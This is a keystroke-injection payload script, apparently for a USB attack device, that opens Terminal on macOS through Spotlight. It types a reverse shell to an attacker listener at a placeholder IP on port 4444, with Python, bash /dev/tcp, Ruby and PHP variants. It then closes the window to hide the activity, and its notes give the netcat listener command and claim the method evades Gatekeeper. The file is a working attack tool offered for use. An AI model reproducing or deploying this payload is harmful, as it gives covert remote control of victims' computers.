// ═══════════════════════════════════════════════════════════════════════════
// Payload: mac_reverse_shell.js
// Target:  macOS (Catalina, Big Sur, Monterey, Ventura, Sonoma)
// Time:    ~4 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: Python reverse shell - macOS varsayılan python3 kullanır
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION - CHANGE THESE VALUES                                     │
// └─────────────────────────────────────────────────────────────────────────┘
var LHOST = "ATTACKER_IP";   // Listener IP
var LPORT = "4444";          // Listener port

// Shell tipi: "python" | "bash" | "ruby" | "php"
var SHELL_TYPE = "python";

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN TERMINAL VIA SPOTLIGHT                                     │
// └─────────────────────────────────────────────────────────────────────────┘
press("GUI-SPACE");     // Spotlight aç
delay(500);
type("terminal");
delay(500);
press("ENTER");
delay(1500);            // Terminal açılmasını bekle

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: REVERSE SHELL                                                   │
// └─────────────────────────────────────────────────────────────────────────┘

if (SHELL_TYPE == "python") {
    // Python3 reverse shell (macOS varsayılanı)
    type("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);");
    type("s.connect((\"" + LHOST + "\"," + LPORT + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);");
    type("os.dup2(s.fileno(),2);subprocess.call([\"/bin/zsh\",\"-i\"])' &");
    press("ENTER");
}

if (SHELL_TYPE == "bash") {
    // Bash reverse shell
    type("bash -c 'bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1' &");
    press("ENTER");
}

if (SHELL_TYPE == "ruby") {
    // Ruby reverse shell (macOS'ta varsayılan)
    type("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + LHOST + "\"," + LPORT + ");");
    type("loop{c.gets.chomp!;($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))}' &");
    press("ENTER");
}

if (SHELL_TYPE == "php") {
    // PHP reverse shell
    type("php -r '$s=fsockopen(\"" + LHOST + "\"," + LPORT + ");exec(\"/bin/zsh -i <&3 >&3 2>&3\");' &");
    press("ENTER");
}

delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: CLEANUP - CLOSE TERMINAL                                        │
// └─────────────────────────────────────────────────────────────────────────┘
press("GUI-w");         // Window kapat
delay(200);
press("ENTER");         // Onay (eğer sorulursa)

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ NOTES                                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
// macOS Catalina+ varsayılan shell: /bin/zsh
// Eski macOS: /bin/bash
// 
// Listener: nc -lvnp 4444
// 
// Gatekeeper downloaded binary'leri engelleyebilir
// Bu inline shell method genellikle bypass eder

